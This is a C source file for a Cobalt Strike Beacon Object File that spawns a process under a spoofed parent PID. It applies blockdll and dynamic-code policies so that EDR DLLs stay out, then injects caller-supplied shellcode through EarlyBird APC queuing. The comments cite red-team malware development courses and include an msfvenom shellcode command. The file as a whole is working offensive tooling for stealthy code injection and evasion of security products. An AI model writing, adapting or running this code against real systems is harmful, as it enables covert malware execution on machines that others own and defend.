#include <windows.h>
#include "beacon.h"

// Credit/shoutout to: Adam Chester @_xpn_ + @SEKTOR7net + Raphael Mudge
// Thank you for the amazing work that you've contributed. I would not be able to publish this without your blogs, videos, and awesome content!
// Main References for PPID Spoofing & blockdll
// - https://blog.xpnsec.com/protecting-your-malware/
// - https://blog.cobaltstrike.com/2021/01/13/pushing-back-on-userland-hooks-with-cobalt-strike/
// - https://institute.sektor7.net/ (Courses)
// - https://github.com/ajpc500/BOFs 

#define intZeroMemory(addr,size) MSVCRT$memset((addr),0,size)

// Bug Fix (07/20/21) - Compiling issues with on Kali
// macos compiled fine, but on kali some definitions were not included. Manually defined them here. 
// Successful compilation on:
// - Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64 GNU/Linux
// - x86_64-w64-mingw32-gcc (GCC) 10-win32 20210110
// Defined in WinBase.h on windows system - has "2" at end to avoid duplicate declaration warnings/errors on macOS
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON2   0x0000100000000000

// grep -ir "PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON" /usr/local/Cellar/mingw-w64/9.0.0/toolchain-x86_64/x86_64-w64-mingw32/include/        
// /usr/local/Cellar/mingw-w64/9.0.0/toolchain-x86_64/x86_64-w64-mingw32/include/winbase.h:#define PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON (0x0001ULL << 36)
#define PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON2 0x0000001000000000

#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY2 0x00020007
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS2    0x00020000
/*                              RCX           RDX               R8                            R9      [RSP+0x0]     [RSP+0x8] [RSP+0x10]
UpdateProcThreadAttribute(si.lpAttributeList,   0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy),    NULL,     NULL);
00007FF6BF71195A  mov         qword ptr[rsp + 30h], 0
	00007FF6BF711963  mov         qword ptr[rsp + 28h], 0
	00007FF6BF71196C  mov         qword ptr[rsp + 20h], 8
	00007FF6BF711975  lea         r9, [policy]
	00007FF6BF71197C  mov         r8d, 20007h
	- R8D = PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 20007h = 0x00020007 = DWORD 4 bytes
*/
typedef struct _STARTUPINFOEXA2 {
    STARTUPINFOA StartupInfo;
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
} STARTUPINFOEXA2, *LPSTARTUPINFOEXA2;

WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, WINBOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
DECLSPEC_IMPORT WINBASEAPI void __cdecl MSVCRT$memset(void *dest, int c, size_t count);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$InitializeProcThreadAttributeList (LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwAttributeCount, DWORD dwFlags, PSIZE_T lpSize);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$UpdateProcThreadAttribute (LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwFlags, DWORD_PTR Attribute, PVOID lpValue, SIZE_T cbSize, PVOID lpPreviousValue, PSIZE_T lpReturnSize);
DECLSPEC_IMPORT WINBASEAPI VOID WINAPI KERNEL32$DeleteProcThreadAttributeList (LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList);
WINBASEAPI void * WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$QueueUserAPC (PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread (HANDLE hThread);

void SpawnProcess(char * peName, DWORD ppid, unsigned char * shellcode, SIZE_T shellcode_len){
    // Declare variables/struct
    // Declare booleans as WINBOOL in BOFs. "bool" will not work
    WINBOOL check1 = 0;
    WINBOOL check2 = 0;
    WINBOOL check3 = 0;
    WINBOOL check4 = 0;
    WINBOOL check5 = 0;
    // Pointer to the RE memory in the remote process we spawn. Returned from when we call WriteProcessMemory with a handle to the remote process
	void * remotePayloadAddr;
    //ULONG_PTR dwData = NULL;
    SIZE_T bytesWritten;
    // (07/20/21) - Changed from STARTUPINFOEX -> STARTUPINFOEXA
    STARTUPINFOEXA2 sInfoEx = { sizeof(sInfoEx) };
    intZeroMemory( &sInfoEx, sizeof(sInfoEx) );
    //   STARTUPINFOEXA - https://docs.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa
    //   STARTUPINFOA   - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    //   typedef struct _STARTUPINFOEXA {
    //     STARTUPINFOA                 StartupInfo;
    //     LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
    //   } STARTUPINFOEXA, *LPSTARTUPINFOEXA
    PROCESS_INFORMATION pInfo;
    intZeroMemory(&pInfo, sizeof(pInfo));
    SIZE_T cbAttributeListSize = 0;

    PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
    HANDLE hParentProcess = NULL;

    // Enable blocking of non-Microsoft signed DLL - This will not block EDR DLL's that are signed by Microsoft
    // "Nope, Falcon loads perfectly fine with 'blockdlls' enabled and hooks ntdll. umppcXXXX.dll (Falcon's injected DLL) is digitally signed by MS so no wonder this doesn't prevents EDR injection pic.twitter.com/lDT4gOuYSV"
    //   — reenz0h (@Sektor7Net) October 25, 2019
    // https://blog.xpnsec.com/protecting-your-malware/
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON2 + PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON2;
    //DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON2;

    // Get a handle to the target process
    HANDLE hProc = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)ppid);
    if (hProc != NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Opened handle 0x%x to process %d(PID)", hProc, ppid);
    }
    else{
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get handle to process: %d(PID)", ppid);
        return;
    }
    // Create an Attribute list. Make sure to have the second argument as 2 since we need to have 2 attributes in our lost
    // Get the size of our PROC_THREAD_ATTRIBUTE_LIST to be allocated
    // - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist
    KERNEL32$InitializeProcThreadAttributeList(NULL, 2, 0, &cbAttributeListSize);
    // Allocate memry for our attribute list. We will supply a pointer to this struct to our STARTUPINFOEXA struct
    pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, cbAttributeListSize);
    // Initialise our list - This sets up our attribute list to hold the correct information to begin with
    KERNEL32$InitializeProcThreadAttributeList(pAttributeList, 2, 0, &cbAttributeListSize);

    // Here we call UpdateProcThreadAttribute twice to make sure our new process will spoof the PPID and start with CFG set to block non MS signed DLLs from loading
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribut
    // Spoof the parent process ID (PPID) using the handle to the process we got from the PID
    KERNEL32$UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS2, &hProc, sizeof(HANDLE), NULL, NULL);
    // Set our new process to not load non-MS signed DLLs - AKA blockDll functional;ity in cobaltstrike
    KERNEL32$UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY2, &policy, sizeof(policy), NULL, NULL);
    sInfoEx.lpAttributeList = pAttributeList;
	
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
    WINBOOL check = KERNEL32$CreateProcessA(NULL, peName, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT|CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&sInfoEx, &pInfo);
    if (check){
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Spawned process: %s | PID: %d | PPID: %d", peName,pInfo.dwProcessId,ppid);
    }
    else{
        BeaconPrintf(CALLBACK_ERROR, "[!] Could not create a process for %s using CreateProcessA()",peName);
        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting SPAWN BOF..");
        return;
    }
// Allocate memory in the spawned process
    // We can write to PAGE_EXECUTE_READ memory in the remote process with WriteProcessMemory, so no need to allocate RW/RWE memory
    remotePayloadAddr = KERNEL32$VirtualAllocEx(pInfo.hProcess, NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    if (remotePayloadAddr != NULL){
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Allocated RE memory in remote process %d (PID) at: 0x%p", pInfo.dwProcessId, remotePayloadAddr);
    }
    else{
        BeaconPrintf(CALLBACK_ERROR, "[!] Could not allocate memory to remote process %d (PID)", pInfo.dwProcessId);
        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting SPAWN BOF..");
        return;
    }
    // Write our popCalc shellcode payload to the remote process we spawned at the memory we allocated 
    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    check3 = KERNEL32$WriteProcessMemory(pInfo.hProcess, remotePayloadAddr, (LPCVOID)shellcode, (SIZE_T)shellcode_len, (SIZE_T *) &bytesWritten);
    if (check3 == 1){
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Wrote %d bytes to memory in remote process %d (PID) at 0x%p", bytesWritten, pInfo.dwProcessId, remotePayloadAddr);
    }
    else{
        BeaconPrintf(CALLBACK_ERROR, "[!] Could not write payload to memory at 0x%p", remotePayloadAddr);
        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting SPAWN BOF..");
        return;
    }

    // This is the "EarlyBird" technique to hijack control of the processes main thread using APC
    // technique taught in Sektor7 course: RED TEAM Operator: Malware Development Intermediate Course
    // https://institute.sektor7.net/courses/rto-maldev-intermediate/463257-code-injection/1435343-earlybird
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc
    // DWORD QueueUserAPC(
    //   PAPCFUNC  pfnAPC,   - A pointer to the payload we want to run
    //   HANDLE    hThread,  - A handle to the thread. Returned at PROCESS_INFORMATION.hThread after CreateProcessA call
    //   ULONG_PTR dwData    - Argument supplied to pfnAPC? Can be NULL
    // );
    check4 = KERNEL32$QueueUserAPC((PAPCFUNC)remotePayloadAddr, pInfo.hThread, (ULONG_PTR) NULL);
    if (check4 == 1){
        BeaconPrintf(CALLBACK_OUTPUT, "[+] APC queued for main thread of %d (PID) to shellcode address 0x%p",  pInfo.dwProcessId, remotePayloadAddr);
    }
    else{
        BeaconPrintf(CALLBACK_ERROR, "[!] Could not queue APC for main thread of %d (PID) to shellcode address 0x%p",  pInfo.dwProcessId, remotePayloadAddr);
        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting SPAWN BOF..");
        return;
    }
    // When we resume the main thread from suspended, APC will trigger and our thread will execute our shellcode
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
    check5 = KERNEL32$ResumeThread(pInfo.hThread);
    if (check5 != -1){
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Thread resumed and shellcode is being executed within the remote process!");
    }
    else{
        BeaconPrintf(CALLBACK_ERROR, "[!] Could not resume thread.");
        BeaconPrintf(CALLBACK_ERROR, "[!] Exiting SPAWN BOF..");
        return;
    }

    // Cleanup the attribute list and close the handle to the parent process we spoofed
    KERNEL32$DeleteProcThreadAttributeList(pAttributeList);
    KERNEL32$CloseHandle(hProc);	
}
void go(char * args, int len) {
    datap parser;
    char * peName;
    DWORD ppid;

     // Example of creating a raw shellcode payload with msfvenom
    //   msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o popCalc.bin
	unsigned char * shellcode;
    SIZE_T shellcode_len; 

    BeaconDataParse(&parser, args, len);
    peName = BeaconDataExtract(&parser, NULL);
    ppid = BeaconDataInt(&parser);
    shellcode_len = BeaconDataLength(&parser);
    shellcode = BeaconDataExtract(&parser, NULL);
    SpawnProcess(peName,ppid,shellcode,shellcode_len);
}
